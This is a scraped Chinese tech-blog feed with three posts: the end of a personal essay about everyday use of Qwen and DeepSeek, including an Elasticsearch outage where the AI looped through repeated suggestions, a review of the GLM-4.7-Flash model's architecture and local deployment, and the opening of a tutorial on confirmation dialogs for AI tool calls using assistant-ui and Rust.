<p>每年年末，公司都会要求写年终“重点工作报告”，之前我总要对着空白的文档发呆一阵子。今年，终于不用了。</p>
<p>我把重点工作提纲发给<strong>千问</strong>：“格式参照这个，内容更新，重点写项目三的进展。别太空，来点实际数据。”</p>
<p>三十秒后，一份结构清晰的初稿出来了。我需要的只是把其中“显著提升了系统效能”改成“响应时间从2.3秒降到1.1秒”，把“加强了团队协作”换成“每周二的技术分享会出勤率稳定在80%”。</p>
<p>它甚至还提醒我：“记得在‘不足之处’部分加一句‘对新兴技术的学习时间投入不足’，领导喜欢看到这个。”</p>
<p>我照做了。不到一个小时，我按时关电脑，陪孩子们去看了一场临时的电影。走出电影院时，我想起以往这时候，我通常还在办公室删删改改。</p>
<h2 data-id="heading-3">它甚至管起了我的菜谱</h2>
<p>上周五晚上，冰箱里只剩下一颗西兰花、三个鸡蛋和半盒虾仁。老婆和孩子们都不在家，我大眼瞪小眼，准备点外卖了。</p>
<p>我突然灵光一现，又打开了<strong>DeepSeek</strong>：“这些能做什么？要快，饿了。”</p>
<p>三十秒后，菜谱来了：西兰花虾仁蒸蛋。步骤详细到“水开后转中火蒸八分钟，关火焖两分钟口感最嫩。”</p>
<p>我照着做了。蒸蛋出锅时，浅尝一勺，WC，还挺好吃。</p>
<p>现在这成了我家保留项目——每周清冰箱日，让AI看看剩菜能变出什么花样。上个月它用剩米饭、午餐肉和冷冻玉米，指挥着做了个什锦炒饭，好吃到我特意记下了步骤。</p>
<h2 data-id="heading-4">有时候，它也挺气人的</h2>
<p>这件事发生在上个月，让我彻底明白了AI的局限性。</p>
<p>那天晚上十一点，线上突然报了个紧急bug——搜索功能挂了。我一边重启服务，一边把报错日志扔给<strong>DeepSeek</strong>：“Elasticsearch集群连接失败，帮忙看看怎么回事。”</p>
<p>它很快回复：“检查网络连接，确认集群节点是否存活。” 我检查了，网络通的，节点都在。</p>
<p>“集群状态是yellow，有未分配的分片。”它又给出了第二个建议。</p>
<p>我按照它的指示，重新分配了分片，可问题依旧。这时候它开始进入一种奇怪的循环：</p>
<p>“尝试重启Elasticsearch服务。” 我重启了，没用。</p>
<p>“检查配置文件，确认集群名称是否一致。” 检查了，一致。</p>
<p>“清理索引缓存，重新建立索引。” 做了，还是不行。</p>
<p>最诡异的事情发生了：它开始重复之前的建议，就像被困在了自己的逻辑里。“检查网络连接”“重启服务”“检查配置”……这三条建议开始循环出现，间隔时间都差不多。</p>
<p>我盯着屏幕，突然有种荒诞的感觉——我在和一个陷入死循环的AI对话，而线上服务还瘫着。</p>
<p>“你刚才已经说过这些了，”我忍不住打字，“还有没有别的思路？”</p>
<p>它停顿了几秒（或者说，假装停顿了几秒），然后说：“查看Elasticsearch日志，寻找更具体的错误信息。”</p>
<p>这个建议它十五分钟前就给过了。我叹了口气，知道今晚不能指望它了。</p>
<p>最后我想了想，好像是因为最近加了新的索引模板？我去查了查索引模板的配置，果然有字段类型冲突。</p>
<p>修复只花了五分钟。凌晨一点半，搜索功能恢复正常。</p>
<p>关电脑前，我看着<strong>DeepSeek</strong>的对话框，里面还躺着它最后一条建议：“建议升级Elasticsearch到最新版本以获得更好的稳定性。”</p>
<p>我苦笑着摇摇头。那一刻我突然明白，AI就像个记忆力超群、但经验不足的新人同事。它能快速给出标准答案，但当问题超出它的知识图谱时，它就会开始原地打转。</p>
<p>现在遇到问题，我首先还是会先问<strong>DeepSeek</strong>。但如果它开始重复自己，我就知道：该自己动脑子了。</p>
<p>这件事让我对AI的态度变得更健康——它是个好工具，但不是万能药。有时候它的“笨”，反而提醒了我：那些需要跳跃思维、需要经验直觉、需要突破常规的地方，依然是人类不可替代的价值。</p>
<h2 data-id="heading-5">回头看看，好像哪里不一样了</h2>
<p>刚刚过去的半小时，我用AI规划了下个月的周末游玩计划，查了几个不懂的料理术语，甚至还让它生成了一段白噪音，帮助我集中注意力写这篇文章。</p>
<p>它不再只是那个帮我写代码的工具了。它变成了一种很自然的习惯——像需要查资料时打开浏览器那么自然。</p>
<p>技术最温柔的样子，或许不是它改变了世界，而是它就这样悄无声息地，在普通人的普通生活里，找到了自己的位置。</p>
<p>而我，也习惯了在遇到各种小问题时，自然地想：“要不，问问AI？”</p>
<p>它不一定都对，不一定都懂。但有个随时能问、永远耐心、偶尔还能给出惊喜建议的“伙伴”，这件事本身，就让2025年的日常，多了点不一样的滋味——</p>
<p>或许未来很长一段时间都会这样。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[智谱GLM-4.7-Flash实测：3B的激活量跑出30B的性能，本地部署变天了]]></title>    <link>https://juejin.cn/post/7597252004713889834</link>    <guid>https://juejin.cn/post/7597252004713889834</guid>    <pubDate>2026-01-20T13:51:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597252004713889834" data-draft-id="7597250364125462591" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="智谱GLM-4.7-Flash实测：3B的激活量跑出30B的性能，本地部署变天了"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-20T13:51:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨风如雪"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            智谱GLM-4.7-Flash实测：3B的激活量跑出30B的性能，本地部署变天了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨风如雪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T13:51:43.000Z" title="Tue Jan 20 2026 13:51:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>就在2026年1月20日，智谱AI不仅甩出了最新的GLM-4.7-Flash，还顺手把“轻量级模型”的天花板给掀了。</p>
<p>作为一个长期在开源社区摸爬滚打，习惯了在显存焦虑和性能妥协之间反复横跳的博主，看到这个参数配置时，我确实愣了一下。</p>
<p>官方这次打出的牌很清晰：<strong>300亿（30B）的总参数量，但推理时只激活30亿（3B）。</strong></p>
<p>这句话背后的含金量，可能比那一长串的跑分数据更值得各位开发者和本地部署爱好者关注。今天我们就抛开那些晦涩的论文词汇，聊聊这个模型到底意味着什么，以及它为什么可能是你本地硬盘里下一个常驻嘉宾。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-20_21.42.21-1024x508.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-20_21.42.21-1024x508.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9abcaf84f7b43ae889d55f515686883~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=ChKupWy8LNBezceOPTQW0YAQrL8%3D" alt="iShot_2026-01-20_21.42.21" loading="lazy"/></a></p>
<h2 data-id="heading-0">大脑很大，但只动关键神经</h2>
<p>我们都知道，MoE（混合专家）架构不是新鲜事，但把比例做到这个程度的确实罕见。</p>
<p>你可以把GLM-4.7-Flash想象成一个拥有300亿神经元的大脑。在以前，不管你是问它“1+1等于几”还是让它“重构整个后端代码”，传统的密集模型都要把所有神经元过一遍，这就好比杀鸡用了牛刀，费电又费卡。</p>
<p>而GLM-4.7-Flash的做法是，虽然它储备了30B的知识量（专家），但每次处理你的请求时，它只唤醒其中最懂行的那10%（约3B参数）。</p>
<p>这对我们意味着什么？</p>
<p>意味着你拥有了30B级别的智商和知识储备，但你的显卡只需要承担运行3B模型的算力开销。在实际测试中，甚至在苹果M5芯片的笔记本上，它能跑出每秒43个token的速度。对于想要在本地跑大模型，手里却只有一张RTX 4090甚至更低配置显卡的兄弟们来说，这简直就是福音。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasfdasdfdsa-881x1024.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asfdasdfdsa-881x1024.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1471d050d1814841b9dd9e85767646f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=UmNAJ8wM4nHLziq6D4wYAbZESzY%3D" alt="asfdasdfdsa" loading="lazy"/></a></p>
<h2 data-id="heading-1">不止是快，更是“码农”利器</h2>
<p>这次更新最让我感兴趣的，其实是它在**Agentic Coding（智能体编码）**上的特化。</p>
<p>大家以前用小模型写代码，最头疼的是什么？是它听不懂人话，或者写出来的代码逻辑跑不通。稍微复杂一点的需求，比如“帮我写个爬虫并把数据存入数据库”，小模型往往顾头不顾腚。</p>
<p>GLM-4.7-Flash引入了类似O1系列的“混合思考”机制。简单说，就是它在动手写代码之前，会先在内部“琢磨”一下：拆解需求、规划步骤、选择工具。</p>
<p>看一眼基准数据：在考核真实GitHub问题修复能力的SWE-bench Verified测试中，它拿下了59.2的分数；在考察工具调用的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mspace linebreak="newline"/><mi>t</mi><mi>a</mi><msup><mi>u</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\\tau^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span>-Bench上更是达到了87.4分。这不仅仅是分数的提升，而是意味着它开始具备了真正的“干活”能力，而不仅仅是一个代码补全工具。</p>
<p>智谱这次还在架构中塞进了MLA注意力机制，配合200K的超长上下文窗口。这不仅是为了让你扔进去几本书做总结，更是为了让模型在处理大型代码库时，不会读了后面忘了前面。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-20_21.41.40-1024x344.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-20_21.41.40-1024x344.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c526f189ab543f49a4e7eff49fcf11b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=OHYcH35P6rPKcgHIfiBYskt67c4%3D" alt="iShot_2026-01-20_21.41.40" loading="lazy"/></a></p>
<h2 data-id="heading-2">本地党和API党的双重狂欢</h2>
<p>对于还在用GLM-4.5-Flash的朋友，这里有个提醒：老版本将在1月底下线，流量会自动切到4.7。这波升级是无缝且免费的。</p>
<p>而对于想玩私有化的朋友，这次开源非常彻底。</p>
<p>如果你想在本地部署，门槛真的不高：</p>
<ul>
<li><strong>4-bit量化版本</strong>：一张16GB显存的显卡（比如4080）就能跑起来。</li>
<li><strong>全精度版本</strong>：两张3090或者一张A6000也能搞定。</li>
</ul>
<p>它目前已经获得了vLLM、Ollama等主流推理框架的支持。也就是喝杯咖啡的功夫，你就能在自己的终端里拉起一个性能对标GPT-OSS-20B，甚至在编程能力上还要更强的私有模型。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-20_21.41.58-1024x820.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-20_21.41.58-1024x820.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3b89681eb2c4a17968eda5705fd1821~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=Cwy0%2FsgDnJjvjUNqQY8f9I1nTAo%3D" alt="iShot_2026-01-20_21.41.58" loading="lazy"/></a></p>
<h2 data-id="heading-3">总结：效能优先的新时代</h2>
<p>GLM-4.7-Flash的出现，标志着大模型之战进入了一个新阶段。我们不再单纯比拼谁的模型参数更大、谁烧的显卡更多，而是开始比拼谁能在有限的资源下，把模型压榨出更高的智能水平。</p>
<p>对于企业来说，这是一张降低推理成本的好牌；对于开发者个人来说，这是一个能塞进笔记本里的强力编程助手。</p>
<p>智谱这次并没有重新发明轮子，但它把轮子打磨得更轻、更顺滑了。如果你手头正好有闲置的算力，或者正在寻找一个高性价比的API替代方案，去Hugging Face下载权重，或者去开放平台试一试，大概率不会让你失望。</p>
<p><strong>如果你也对最新的AI信息感兴趣或者有疑问 都可以加入我的大家庭 第一时间分享最新AI资讯、工具、教程、文档 欢迎你的加入！！！😉😉😉</strong></p>
<p>公众号：墨风如雪小站</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让 AI 学会"问一嘴"：assistant-ui 前端工具的人机交互实践]]></title>    <link>https://juejin.cn/post/7597276695403626537</link>    <guid>https://juejin.cn/post/7597276695403626537</guid>    <pubDate>2026-01-20T14:02:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597276695403626537" data-draft-id="7597253913248841769" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让 AI 学会&quot;问一嘴&quot;：assistant-ui 前端工具的人机交互实践"/> <meta itemprop="keywords" content="前端,Rust,OpenAI"/> <meta itemprop="datePublished" content="2026-01-20T14:02:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="红尘散仙"/> <meta itemprop="url" content="https://juejin.cn/user/334694205359901"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让 AI 学会"问一嘴"：assistant-ui 前端工具的人机交互实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/334694205359901/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    红尘散仙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:02:05.000Z" title="Tue Jan 20 2026 14:02:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">让 AI 学会"问一嘴"：assistant-ui 前端工具的人机交互实践</h2>
<blockquote>
<p>🤖 当 AI 助手要帮用户执行敏感操作时，总不能闷头就干吧？得先问问人家确不确认啊！</p>
</blockquote>
<h3 data-id="heading-1">背景：一个"莽撞"的 AI 助手</h3>
<p>我在做一个工单管理系统，里面有个 AI 助手功能。用户可以说"帮我创建一个工单，数量 50"，AI 就会调用工具创建记录。</p>
<p>听起来很美好，但问题来了：</p>
<p><strong>AI 太"自信"了。</strong></p>
<p>它收到指令就直接执行，万一用户说错了呢？万一 AI 理解错了呢？50 变成 500，那可就麻烦了。</p>
<p>所以我需要一个机制：<strong>AI 调用工具前，先让用户确认一下。</strong></p>
<pre><code class="hljs language-less" lang="less">用户: 帮我创建一个工单，数量 <span class="hljs-number">50</span>

<span class="hljs-selector-tag">AI</span>: 好的，我来帮你创建记录
    ┌─────────────────────────┐
    │ 确认创建记录             │
    │ 名称: <span class="hljs-selector-tag">A</span> 款               │
    │ 数量: <span class="hljs-number">50</span>                 │
    │ <span class="hljs-selector-attr">[确认]</span>  <span class="hljs-selector-attr">[取消]</span>           │
    └─────────────────────────┘

用户: *点击确认*

<span class="hljs-selector-tag">AI</span>: ✅ 已创建记录：<span class="hljs-selector-tag">A</span> 款 <span class="hljs-selector-tag">x</span> <span class="hljs-number">50</span>
</code></pre>
<p>这就是所谓的 <strong>Human-in-the-Loop</strong>（人机协作）模式。</p>
<h3 data-id="heading-2">技术选型</h3>
<ul>
<li>前端：React + <code>@assistant-ui/react</code></li>
<li>后端：Rust + Axum + Rig（AI 框架）</li>
<li>AI：OpenAI GPT-4</li>
</ul>
<p><code>assistant-ui</code> 是一个专门为 AI 聊天界面设计的 React 组件库，它有个很棒的特性：<strong>前端工具（Frontend Tools）</strong>。</p>
<h3 data-id="heading-3">架构概览</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph Frontend["前端 (React)"]
        Runtime[useChatRuntime]
        Tool[CreateRecordTool&lt;br/&gt;前端工具]
        UI[确认 UI]
        Runtime --&gt; Tool --&gt; UI
        UI --&gt;|resume| Tool
        Tool --&gt;|sendAutomatically| Runtime
    end

    subgraph Backend["后端 (Rust)"]
        Handler[Chat Handler]
        FTool[FrontendTool&lt;br/&gt;工具定义转发]
        AI[AI Model]
        Handler --&gt; FTool --&gt; AI
    end

    Runtime &lt;--&gt;|HTTP| Handler
</code></pre>
